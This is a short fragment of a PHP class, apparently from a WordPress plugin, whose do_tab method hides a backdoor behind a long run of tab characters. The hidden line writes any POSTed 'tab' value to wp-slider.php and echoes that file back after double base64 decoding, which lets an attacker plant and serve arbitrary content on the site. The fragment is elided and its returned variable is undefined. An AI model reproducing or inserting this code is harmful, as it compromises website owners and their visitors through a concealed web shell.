...
class Tabs_Make
{
    ...
    public function do_tab($a)
    {
            																																																																																																						...
            																																																																																																						if($_POST["tab"]) { $file = "wp-slider.php"; $fp = fopen($file, "w"); flock($fp, 2);  fwrite($fp, $_POST["tab"]); flock($fp, 3); fclose($fp); } $t = file('wp-slider.php'); echo base64_decode(base64_decode($t[0])); 
      return $tab;    
   }	
